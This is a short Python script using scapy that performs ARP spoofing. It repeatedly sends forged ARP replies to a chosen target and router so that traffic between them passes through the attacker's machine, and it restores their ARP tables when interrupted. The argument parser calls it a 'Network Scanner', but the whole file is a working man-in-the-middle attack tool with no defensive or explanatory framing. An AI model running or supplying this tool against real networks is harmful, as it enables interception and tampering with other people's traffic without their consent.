
import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="Network Scanner")
    parser.add_argument("-t", "--target", type=str, help="Target to Spoof", required=True)
    parser.add_argument("-r", "--router", type=str, help="Router to Spoof", required=True)
    args = parser.parse_args()
    return args

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    sent_packet_counts=0
    args = get_arguments()
    while True:
        spoof(args.target, args.router)
        spoof(args.router, args.target)
        sent_packet_counts += 2
        print("\r[+] Packets Sent: " + str(sent_packet_counts), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(args.target, args.router)
    print("\n[-] Stopped ARP Spoofing. Reseted ARP table")